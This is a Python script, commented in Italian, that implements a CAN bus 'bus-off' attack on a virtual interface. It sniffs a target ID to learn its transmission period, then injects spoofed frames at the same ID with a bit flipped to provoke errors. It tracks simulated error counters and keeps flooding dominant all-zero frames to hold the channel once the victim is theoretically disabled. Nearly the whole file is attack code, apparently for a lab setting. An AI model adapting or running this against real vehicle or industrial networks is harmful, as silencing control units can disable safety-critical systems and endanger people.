import can
import time
import sys
import random

# --- CONFIGURAZIONE ---
CAN_INTERFACE = 'vcan0'
TARGET_ID = 0x123 
BUS_OFF_THRESHOLD = 256
TEC_PASSIVE_THRESHOLD = 128

# Parametri per la stima della frequenza
SAMPLE_SIZE = 5 # Numero di campioni per stimare il periodo
INITIAL_TEC = 0
# ----------------------

# --- FUNZIONI PER LA MANIPOLAZIONE BIT ---

def bytes_to_bitstring(data):
    """Converte un array di byte in una stringa binaria."""
    # Il formato '08b' assicura che ogni byte sia rappresentato con 8 bit (es. 0x01 -> '00000001')
    return ''.join(f'{b:08b}' for b in data)

def bitstring_to_bytes(bit_string):
    """Converte una stringa binaria in un array di byte."""
    data = bytearray()
    for i in range(0, len(bit_string), 8):
        # Converte ogni sequenza di 8 bit in un intero
        data.append(int(bit_string[i:i+8], 2))
    return list(data)

def find_and_flip(data_bytes):
    """Trova il primo bit '1' (Recessivo) e lo flippa a '0' (Dominante)."""
    original_bit_string = bytes_to_bitstring(data_bytes)
    modified_bit_string = list(original_bit_string)
    flip_index = -1
    
    # Cerchiamo il primo '1' (Recessivo) nel payload dati per forzare il '0' (Dominante)
    for i in range(len(modified_bit_string)):
        if modified_bit_string[i] == '1':
            modified_bit_string[i] = '0' # Flip a Dominante (0)
            flip_index = i
            break
            
    if flip_index == -1:
        # Nessun bit Recessivo trovato; non è possibile forzare il Bit Error in modo chirurgico.
        return data_bytes, -1 
        
    modified_bit_string = "".join(modified_bit_string)
    modified_bytes = bitstring_to_bytes(modified_bit_string)
    
    return modified_bytes, flip_index

# --- FUNZIONE PRINCIPALE DELL'ATTACCANTE ---

def start_attacker_dynamic():
    
    try:
        # receive_own_messages=False aiuta a evitare di sniffare i propri attacchi
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan', receive_own_messages=False)
        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
    except OSError as e:
        print(f"❌ [Attaccante] Errore di connessione: {e}")
        return

    # Variabili di stato
    victim_tec_sim = INITIAL_TEC
    adversary_tec_sim = INITIAL_TEC
    attack_counter = 0
    
    # Variabili per la stima del periodo
    timestamps = []
    estimated_period = 0.0

    # --- FASE 1: STIMA DELLA FREQUENZA (Sniffing) ---
    print("\n🔍 [Attaccante] FASE 1: Stima della frequenza della Vittima...")
    
    while len(timestamps) < SAMPLE_SIZE + 1: # Aumentato a SAMPLE_SIZE + 1 per un calcolo più stabile
        msg = bus.recv(timeout=1.0)
        
        if msg is not None and msg.arbitration_id == TARGET_ID:
            now = time.time()
            if len(timestamps) > 0:
                interval = now - timestamps[-1]
                print(f"   [Sniff] Rilevato ID {hex(TARGET_ID)}. Intervallo misurato: {interval:.3f}s")
            else:
                print(f"   [Sniff] Primo messaggio rilevato.")
            
            timestamps.append(now)

            if len(timestamps) >= 2:
                # Calcola la media dei periodi misurati finora
                estimated_period = (timestamps[-1] - timestamps[0]) / (len(timestamps) - 1)
        
    print(f"✅ [Attaccante] Stima completata. Periodo stimato (T): {estimated_period:.3f}s")
    
    if estimated_period < 0.01:
        estimated_period = 5.0

    # --- FASE 2: ATTACCO CHIRURGICO (Bit Flipping) ---
    print(f"\n--- FASE 2: Attacco avviato con T = {estimated_period:.3f}s ---")
    
    # Imposta l'ora del prossimo attacco basandosi sull'ultimo messaggio sniffato
    next_attack_time = timestamps[-1] + estimated_period 

    while True: # Loop infinito per la persistenza
        
        time_to_wait = next_attack_time - time.time()
        
        if time_to_wait > 0:
            # Attendiamo l'istante preciso del prossimo slot di trasmissione
            time.sleep(time_to_wait)

        # 1. TENTA DI SNIFFARE IL MESSAGGIO CHE LA VITTIMA STA INVIANDO ORA
        # Usiamo un timeout MOLTO breve (es. 5ms) per catturare il frame proprio all'inizio dello slot.
        reference_msg = bus.recv(timeout=0.005) 
        
        modified_data = None
        flip_index = -1
        
        if reference_msg is not None and reference_msg.arbitration_id == TARGET_ID:
            # Abbiamo sniffato il messaggio della Vittima in tempo utile
            modified_data, flip_index = find_and_flip(reference_msg.data)
        
        
        # 2. LOGICA TEC SIMULATA
        if victim_tec_sim < BUS_OFF_THRESHOLD:
            # Calcolo TEC (Fase 1: +8/+8, Fase 2: +7/-1)
            if victim_tec_sim < TEC_PASSIVE_THRESHOLD:
                victim_tec_change, adversary_tec_change = 8, 8
                fase_desc = "Fase 1 (Active)"
            else:
                victim_tec_change, adversary_tec_change = 7, -1 
                fase_desc = "Fase 2 (Passive)"
            
            victim_tec_sim += victim_tec_change
            adversary_tec_sim += adversary_tec_change

            print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
            print(f"[{fase_desc}] TEC Sim: V={victim_tec_sim} ({victim_tec_change:+d}), A={adversary_tec_sim} ({adversary_tec_change:+d})")

            if adversary_tec_sim >= BUS_OFF_THRESHOLD:
                print("🚨🚨 [Attaccante] BUS OFF RILEVATO! L'attaccante si auto-disattiva. Interrompo l'attacco.")
                break
        
        else:
            # VITTMA È IN BUS OFF TEORICO -> Modalità persistenza
            print(f"\n--- CICLO PERSISTENTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
            print(f"🔥 [Persistenza] Vittima in Bus Off (TEC {victim_tec_sim}). Continuo a bloccare il canale...")
            # Usa un payload generico dominante per mantenere il blocco
            modified_data = [0x00] * 8
        
        
        # 3. INIEZIONE DEL MESSAGGIO MALEVOLO MANIPOLATO
        if modified_data is not None:
            try:
                msg_attack = can.Message(
                    arbitration_id=TARGET_ID,
                    data=modified_data, 
                    is_extended_id=False
                )
                bus.send(msg_attack)
                if flip_index != -1:
                    print(f"💣 [Attaccante] Iniettato Bit Error al bit #{flip_index}.")
                else:
                    print(f"💣 [Attaccante] Iniettato frame di blocco (payload: {modified_data}).")
                
            except can.CanError:
                print("⚠️ Errore CAN durante l'invio. L'Attaccante potrebbe essere in stato di errore.")
                pass 
        else:
            print("⚠️ Impossibile eseguire l'attacco: Nessun messaggio Vittima sniffato o manipolazione fallita.")

        attack_counter += 1
        # Aggiorna il tempo di attacco successivo
        next_attack_time += estimated_period

    bus.shutdown()
    print("\n🛑 [Attaccante] Disconnesso.")

if __name__ == '__main__':
    start_attacker_dynamic()
